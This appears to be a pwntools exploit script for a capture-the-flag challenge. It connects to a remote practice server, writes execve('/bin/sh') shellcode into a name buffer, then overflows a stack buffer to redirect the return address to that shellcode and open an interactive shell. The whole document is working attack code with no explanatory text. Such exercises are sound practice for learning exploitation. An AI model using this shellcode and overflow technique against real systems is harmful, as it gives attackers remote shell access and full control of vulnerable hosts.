from pwn import *

# local test
# p = process("./prob1")

# remote host
p = remote("ctf.j0n9hyun.xyz", 3003)

name_addr = p32(0x804a060)
p.recvuntil("Name : ")
p.sendline('\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80')
p.recvuntil("input : ")

payload = 'A' * (0x14 + 4)
payload += name_addr

p.sendline(payload)

p.interactive()